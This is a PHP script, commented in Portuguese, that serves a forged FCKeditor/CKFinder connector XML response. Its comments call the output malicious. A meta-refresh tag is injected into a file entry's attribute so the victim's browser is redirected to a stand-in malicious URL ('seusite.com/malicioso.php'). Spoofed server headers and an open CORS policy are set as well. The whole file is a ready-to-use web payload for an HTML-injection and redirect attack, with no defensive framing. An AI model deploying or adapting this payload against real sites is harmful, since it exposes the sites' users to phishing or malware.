<?php
ob_start(); // Inicia o buffer de saída para evitar espaços em branco acidentais

// Defina o cabeçalho como XML
header('Content-Type: text/xml; charset=UTF-8');
header('X-Powered-By: PHP/8.0.30');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST');
header('Access-Control-Allow-Headers: X-Requested-With');
header('Vary: Accept-Encoding');
header('X-Turbo-Charged-By: LiteSpeed');
header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
header('Pragma: no-cache');

// Gera o XML malicioso com o redirecionamento embutido
echo '<?xml version="1.0" encoding="UTF-8"?>';
echo '<Connector command="GetFoldersAndFiles" resourceType="Document">';
echo '<CurrentFolder path="/1 - f/" url=""/>';
echo '<Folders/>';
echo '<Files>';
// Inclui o redirecionamento usando a tag meta com refresh
echo '<File desc="1" name="Loading..." size="&lt;html&gt;&lt;head&gt;&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0;url=https://seusite.com/malicioso.php&quot;&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt;" url="1"/>';
echo '</Files>';
echo '</Connector>';

ob_end_flush(); // Envia o buffer de saída e termina o script
?>
